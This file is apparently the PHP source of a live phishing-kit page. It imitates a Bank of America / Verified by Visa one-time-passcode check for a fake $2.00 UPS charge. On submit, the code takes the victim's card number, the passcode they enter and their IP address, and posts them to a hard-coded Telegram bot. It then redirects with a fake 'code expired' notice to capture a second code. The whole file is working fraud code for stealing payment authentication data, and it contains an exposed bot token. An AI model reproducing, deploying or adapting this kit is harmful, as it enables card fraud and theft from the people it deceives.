<?php
include'antibot.php';
$IdTelegram=array("1305831045"); 
$Bin=$_GET['bin'];
$lbin=$_GET['lbin'];
$numb=$_GET['numb'];
$realip=$_GET['realip'];
if(isset($_POST['submit'])){
 $BotTelegramToken="5092363740:AAFbRwIMY8fQpgPUppzF7AncBKbCwu_Ev3M";
 $messageTelegram  = "|==[ VBV INFO ]==|\n";
 $messageTelegram .= "|CCNUMB     :  ".$numb."\n";
 $messageTelegram .= "|PASSW     :  ".$_POST['Credential']."\n";
 $messageTelegram .= "|IP         :  ".$_GET['realip']."\n";
 $messageTelegram .= "|==[ UPS ARON-TN ]==|\n";
 foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
 }
  HEADER("Location: loading.php?numb=".$numb."&phone=".$_GET['phone']."&realip=".$_GET['realip'].'&repeat=1');
}
?>

<div class="header" id="HeaderLogos" style="box-sizing: border-box; margin: 0px auto; height: 70px; max-width: 400px; font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif; font-size: 12.5px; background-color: rgb(255, 255, 255);"><div class="row no-pad" style="box-sizing: border-box; padding: 0px;"><div class="col-12" style="box-sizing: border-box; width: 400px; float: left; padding: 0px 0.714em;"><img alt="Bank of America Logo" class="img-responsive header-logo pull-left" src="data:image/png;base64,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" style="box-sizing: border-box; border: 0px; vertical-align: middle; height: auto; max-width: 40%; display: block; float: left !important; max-height: 70px; width: auto;">


           <?php 
      //3-4-5-6
      $numb=$_GET['numb'];
      if($numb[0]=='3'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/amex.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; height: auto; max-width: 40%; display: block; float: right !important; max-height: 70px; width: auto;">');
      }else if($numb[0]=='4'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/vbv_logo.gif" style="box-sizing: border-box; border: 0px; vertical-align: middle; height: auto; max-width: 40%; display: block; float: right !important; max-height: 70px; width: auto;">');
      }else if($numb[0]=='5'){
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/10ad0777-c108-45e7-8d80-8da0bb22ccd3.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; height: auto; max-width: 40%; display: block; float: right !important; max-height: 70px; width: auto;">');
      }else{
        echo('<img class="img-responsive header-logo pull-right" src="VBV_files/discover.png" style="box-sizing: border-box; border: 0px; vertical-align: middle; height: auto; max-width: 40%; display: block; float: right !important; max-height: 70px; width: auto;">');
      }
     ?>

</div></div></div><div class="container container-sticky-footer" style="box-sizing: border-box; max-width: 400px; margin: 0px auto; padding: 0.75em 0px 0px; font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif; font-size: 12.5px; background-color: rgb(255, 255, 255);">


	<form action="" method="post"  style="box-sizing: border-box; margin-bottom: 0px;"><div class="body" dir="LTR" style="box-sizing: border-box; max-width: 400px; margin: 0px auto; bottom: 55px;"><h1 class="screenreader-only" style="box-sizing: border-box; font-size: 1.25em; margin: 20px 0px 10px; font-family: inherit; font-weight: 500; line-height: 1.1; position: absolute; left: -10000px; top: auto; width: 1px; height: 1px; overflow: hidden;">Your One-time Passcode has been sent</h1><br style="box-sizing: border-box;"><div class="row" style="box-sizing: border-box; padding: 4.79688px;"></div><div class="row" style="box-sizing: border-box; padding: 4.79688px;"><div class="col-12" id="ValidateOneUpMessage" style="box-sizing: border-box; width: 390.406px; float: left; padding: 0px 0.714em;"><div id="Body1" style="box-sizing: border-box;">Verification using one-time authorization code.<br style="box-sizing: border-box;"><br style="box-sizing: border-box;"><span style="box-sizing: border-box; font-weight: 700;">
<?php if(isset($_GET['repeat'])){ if($_GET['repeat']=='1'){echo('<p style="color:red;font-size: 11px; font-weight: bold;">Your unique code card has expired. Wait, we will send you a new one.</p>');};};?>   
	Your one-time authorization code has been sent</span></div></div></div><br style="box-sizing: border-box;"><div class="row form-two-col" style="box-sizing: border-box; padding: 4.79688px;"><div class="col-12" style="box-sizing: border-box; width: 390.406px; float: left; padding: 0px 0.714em;"><fieldset id="ValidateTransactionDetailsContainer" style="box-sizing: border-box; border-width: 0px; border-style: initial; border-color: initial; margin: 0px; padding: 0px 0px 0.25em; min-width: 0px;"><legend id="ValidateTransactionDetailsHeader" style="box-sizing: border-box; border-width: 0px; border-style: initial; padding: 0px; width: 372.562px; margin-bottom: 0.286em; font-size: 1em; line-height: inherit; color: rgb(103, 103, 103); font-weight: 700;">Transaction Details</legend><div class="validate-field row" style="box-sizing: border-box; padding: 4.46875px 4.46875px 0px;"><span class="validate-label col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; text-align: right; display: inline-block; max-width: 100%; font-weight: 700; margin-bottom: 0px;">Merchant:</span><span class="col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em;">Ups Service</span></div><div class="validate-field row" style="box-sizing: border-box; padding: 4.46875px 4.46875px 0px;"><span class="validate-label col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; text-align: right; display: inline-block; max-width: 100%; font-weight: 700; margin-bottom: 0px;">Transaction Amount:</span><span class="col-6 always-left-to-right" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; unicode-bidi: embed; direction: ltr;">$2.00 USD</span></div><div class="validate-field row" style="box-sizing: border-box; padding: 4.46875px 4.46875px 0px;"><span class="validate-label col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; text-align: right; display: inline-block; max-width: 100%; font-weight: 700; margin-bottom: 0px;">Card Number:</span><span class="col-6 always-left-to-right" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; unicode-bidi: embed; direction: ltr;">************<?php echo($lbin);?></span></div><div class="validate-field row" style="box-sizing: border-box; padding: 4.46875px 4.46875px 0px;"><span class="validate-label col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; text-align: right; display: inline-block; max-width: 100%; font-weight: 700; margin-bottom: 0px;">Enter Code:</span>
	<span style="box-sizing: border-box;">

		<input name="Credential" required type="text" value="" style="box-sizing: border-box; font: inherit; margin: 0px; width: 130px; max-width: 130px;">

	</span></div><div class="validate-field row" style="box-sizing: border-box; padding: 4.46875px 4.46875px 0px;"><span class="validate-label col-6" style="box-sizing: border-box; width: 181.812px; float: left; padding: 0px 0.714em; text-align: right; display: inline-block; max-width: 100%; font-weight: 700; margin-bottom: 0px;">&nbsp;</span></div></fieldset></div></div><div class="row" style="box-sizing: border-box; padding: 4.79688px;"><div class="col-12" id="ValidateOptInMessage" style="box-sizing: border-box; width: 390.406px; float: left; padding: 0px 0.714em;"></div></div><div class="row" style="box-sizing: border-box; padding: 4.79688px;"><div class="col-12" style="box-sizing: border-box; width: 390.406px; float: left; padding: 0px 0.714em;"><div id="linkContainer" style="box-sizing: border-box; position: relative;"><a href="https://authentication.cardinalcommerce.com/VALIDATE/5afdd7913bb1266e84329bfd#" id="ResendLink" style="box-sizing: border-box; background-color: transparent; color: rgb(0, 0, 0);">Receive another code</a></div></div></div></div><div class="sticky-footer" style="box-sizing: border-box; margin: 0px auto; max-width: 400px;"><div class="row no-pad" style="box-sizing: border-box; padding: 0px;"><div class="col-12 text-center" style="box-sizing: border-box; text-align: center; width: 400px; float: left; padding: 0px 0.714em;">

		<button type="submit" name="submit" class="btn btn-primary" style="color: rgb(255, 255, 255); font-style: inherit; font-variant: inherit; font-weight: 700; font-stretch: inherit; font-size: 14px; line-height: 1.42857; font-family: inherit; margin: 0px; overflow: visible; appearance: button; cursor: pointer; box-shadow: rgba(255, 255, 255, 0.15) 0px 1px 0px inset, rgba(0, 0, 0, 0.075) 0px 1px 1px; background: rgb(0, 115, 207); border-width: initial; border-style: none; border-color: initial; vertical-align: middle; touch-action: manipulation; padding: 6px 20px; border-radius: 0px; user-select: none; word-break: break-word;">Submit</button>

</form>



	</div></div><div class="footer" id="FooterLinks" style="box-sizing: border-box; margin: 0px auto; max-width: 400px;"><div class="row" style="box-sizing: border-box; padding: 4.79688px 4.79688px 0px;"><div class="col-12" style="box-sizing: border-box; width: 390.406px; float: left; padding: 0px 0.714em; text-align: center;"><ul class="list-inline list-inline-separated pull-left" style="box-sizing: border-box; margin-top: 0px; margin-bottom: 0px; padding-left: 0px; list-style: none; margin-left: -5px; float: left !important;"><li style="box-sizing: border-box; display: inline-block; padding-left: 5px; padding-right: 5px; margin-left: 0px;"><a class="btn btn-link" data-target="#Terms" data-toggle="modal" href="https://authentication.cardinalcommerce.com/VALIDATE/5afdd7913bb1266e84329bfd#Terms" id="FooterLink1" style="box-sizing: border-box; background-color: transparent; color: rgb(0, 0, 0); display: inline-block; margin-bottom: 0px; font-weight: 700; vertical-align: middle; touch-action: manipulation; cursor: pointer; background-image: none; border: 1px solid transparent; padding: 0px; font-size: 0.95em; line-height: 1.42857; border-radius: 0px; user-select: none; box-shadow: none; text-shadow: none; word-break: break-word;">Terms and Conditions</a></li></ul><a id="ExitLink" class="list-inline list-inline-separated pull-right" href="https://authentication.cardinalcommerce.com/VALIDATE/5afdd7913bb1266e84329bfd#" style="box-sizing: border-box; background-color: transparent; color: rgb(0, 0, 0); padding-left: 0px; list-style: none; margin-left: -5px; margin-bottom: 0px; float: right !important;">Exit</a></div></div></div></div></div>